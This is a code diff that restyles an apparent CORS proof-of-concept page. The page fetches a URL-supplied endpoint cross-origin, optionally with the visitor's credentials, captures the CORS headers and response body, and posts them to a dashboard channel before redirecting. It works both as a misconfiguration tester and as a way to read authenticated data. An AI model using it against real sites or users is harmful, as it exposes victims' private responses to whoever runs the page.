@@ -3,20 +3,147 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Loading...</title>
+<title>Loading…</title>
 <style>
-  * { box-sizing: border-box; margin: 0; padding: 0; }
-  body { background: #fff; display: flex; align-items: center; justify-content: center; min-height: 100vh; font-family: sans-serif; }
-  .spinner { width: 32px; height: 32px; border: 3px solid #eee; border-top-color: #999; border-radius: 50%; animation: spin 0.8s linear infinite; }
-  @keyframes spin { to { transform: rotate(360deg); } }
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --bg:      #0a0c0e;
+    --accent:  #00ff88;
+    --red:     #ff4444;
+    --amber:   #ffaa00;
+    --text:    #8b949e;
+    --font:    'Courier New', 'Consolas', monospace;
+  }
+
+  body {
+    background: var(--bg);
+    background-image:
+      linear-gradient(rgba(0,255,136,0.025) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(0,255,136,0.025) 1px, transparent 1px);
+    background-size: 28px 28px;
+    color: var(--text);
+    font-family: var(--font);
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    overflow: hidden;
+  }
+
+  .card {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 1.4rem;
+    padding: 2.5rem 3rem;
+    background: rgba(13,17,23,0.9);
+    border: 1px solid #1c2128;
+    border-radius: 10px;
+    max-width: 340px;
+    width: 90vw;
+    backdrop-filter: blur(8px);
+  }
+
+  /* Ring spinner */
+  .ring {
+    position: relative;
+    width: 48px;
+    height: 48px;
+    flex-shrink: 0;
+  }
+
+  .ring svg {
+    animation: spin 1.2s linear infinite;
+    width: 100%;
+    height: 100%;
+  }
+
+  .ring-track { fill: none; stroke: #1c2128; stroke-width: 3; }
+  .ring-fill  { fill: none; stroke: var(--accent); stroke-width: 3; stroke-linecap: round;
+                stroke-dasharray: 80 150; animation: spin 1.2s ease-in-out infinite; }
+
+  @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+
+  /* Dot pulse row */
+  .dots {
+    display: flex;
+    gap: 6px;
+    align-items: center;
+  }
+
+  .dot {
+    width: 6px;
+    height: 6px;
+    border-radius: 50%;
+    background: var(--accent);
+    animation: dotPulse 1.4s ease-in-out infinite;
+    opacity: 0.3;
+  }
+
+  .dot:nth-child(1) { animation-delay: 0s; }
+  .dot:nth-child(2) { animation-delay: 0.22s; }
+  .dot:nth-child(3) { animation-delay: 0.44s; }
+
+  @keyframes dotPulse {
+    0%, 80%, 100% { opacity: 0.15; transform: scale(0.8); }
+    40%           { opacity: 1;    transform: scale(1.2); box-shadow: 0 0 6px var(--accent); }
+  }
+
+  .label {
+    font-size: 0.7rem;
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+    color: var(--text);
+  }
+
+  .sublabel {
+    font-size: 0.62rem;
+    letter-spacing: 0.06em;
+    color: #484f58;
+    text-align: center;
+    line-height: 1.6;
+  }
+
+  /* State: done */
+  .state-done .ring svg { animation: none; }
+  .state-done .ring-fill {
+    animation: none;
+    stroke: var(--accent);
+    stroke-dasharray: 220 0;
+  }
+  .state-done .label { color: var(--accent); }
+
+  /* State: error */
+  .state-error .ring-fill { stroke: var(--red); animation: none; stroke-dasharray: 220 0; }
+  .state-error .ring svg  { animation: none; }
+  .state-error .label     { color: var(--red); }
+  .state-error .dot       { background: var(--red); }
 </style>
 </head>
 <body>
-<div class="spinner"></div>
+
+<div class="card" id="card">
+  <div class="ring" id="ring" aria-hidden="true">
+    <svg viewBox="0 0 48 48">
+      <circle class="ring-track" cx="24" cy="24" r="20"/>
+      <circle class="ring-fill"  cx="24" cy="24" r="20"/>
+    </svg>
+  </div>
+
+  <div class="dots" id="dots" aria-hidden="true">
+    <div class="dot"></div>
+    <div class="dot"></div>
+    <div class="dot"></div>
+  </div>
+
+  <div class="label" id="label" role="status" aria-live="polite">Initiating request…</div>
+  <div class="sublabel" id="sublabel">Sending cross-origin fetch. Do not close this tab.</div>
+</div>
 
 <script>
 (async () => {
-  const params = new URLSearchParams(window.location.search);
+  const params   = new URLSearchParams(window.location.search);
   const endpoint  = params.get('endpoint') || '';
   const method    = params.get('method') || 'GET';
   const withCreds = params.get('creds') === '1';
@@ -24,24 +151,38 @@
 
   const channel = new BroadcastChannel('cors_poc_channel');
 
+  const labelEl    = document.getElementById('label');
+  const sublabelEl = document.getElementById('sublabel');
+  const card       = document.getElementById('card');
+
   const result = {
     endpoint,
     method,
     withCreds,
     timestamp: Date.now(),
-    headers: {},
-    status: null,
+    headers:   {},
+    status:    null,
     responseBody: null,
     vulnerable: false,
     verdict: ''
   };
 
-  if(!endpoint){
+  function setState(state, lbl, sub) {
+    card.className = 'card ' + (state ? 'state-' + state : '');
+    labelEl.textContent    = lbl || '';
+    sublabelEl.textContent = sub || '';
+  }
+
+  if (!endpoint) {
     result.verdict = 'No endpoint provided.';
+    setState('error', 'No endpoint', 'Missing endpoint parameter. Redirecting…');
     channel.postMessage(result);
+    await delay(600);
     window.location.href = redirect;
     return;
   }
+
+  setState('', 'Sending request…', 'Cross-origin fetch in progress.');
 
   try {
     const fetchOpts = {
@@ -52,6 +193,8 @@
 
     const res = await fetch(endpoint, fetchOpts);
     result.status = res.status;
+
+    setState('', 'Reading response…', 'Extracting CORS headers and body.');
 
     const interestingHeaders = [
       'access-control-allow-origin',
@@ -64,39 +207,47 @@
 
     interestingHeaders.forEach(h => {
       const v = res.headers.get(h);
-      if(v) result.headers[h] = v;
+      if (v) result.headers[h] = v;
     });
 
     const acao = result.headers['access-control-allow-origin'];
     const acac = result.headers['access-control-allow-credentials'];
 
-    if(acao && acao !== 'null' && acao !== ''){
+    if (acao && acao !== 'null' && acao !== '') {
       result.vulnerable = true;
-      result.verdict = `CORS misconfiguration confirmed — server reflected arbitrary origin "${acao}". ` +
-        (acac === 'true' ? 'Credentials allowed — authenticated requests can be read cross-origin.' : 'Credentials flag not set.');
+      result.verdict =
+        `CORS misconfiguration confirmed — server reflected arbitrary origin "${acao}". ` +
+        (acac === 'true'
+          ? 'Credentials allowed — authenticated requests can be read cross-origin.'
+          : 'Credentials flag not set.');
     } else {
       result.verdict = 'Not vulnerable — server did not reflect an arbitrary origin in CORS headers.';
     }
 
     try {
       const text = await res.text();
-      try { result.responseBody = JSON.parse(text); }
-      catch { result.responseBody = text; }
-    } catch(e) {
+      try        { result.responseBody = JSON.parse(text); }
+      catch (_)  { result.responseBody = text; }
+    } catch (_) {
       result.responseBody = '(could not read body)';
     }
 
-  } catch(err) {
+    setState('done', 'Done — redirecting…', 'Data transmitted to dashboard.');
+
+  } catch (err) {
     result.status = 0;
     result.verdict = 'Request blocked by browser CORS policy — not vulnerable (or endpoint unreachable). Error: ' + err.message;
     result.vulnerable = false;
+    setState('error', 'Blocked by CORS', 'Not vulnerable. Redirecting…');
   }
 
   channel.postMessage(result);
-
-  await new Promise(r => setTimeout(r, 300));
+  await delay(400);
   window.location.href = redirect;
+
+  function delay(ms) { return new Promise(r => setTimeout(r, ms)); }
 })();
 </script>
+
 </body>
 </html>
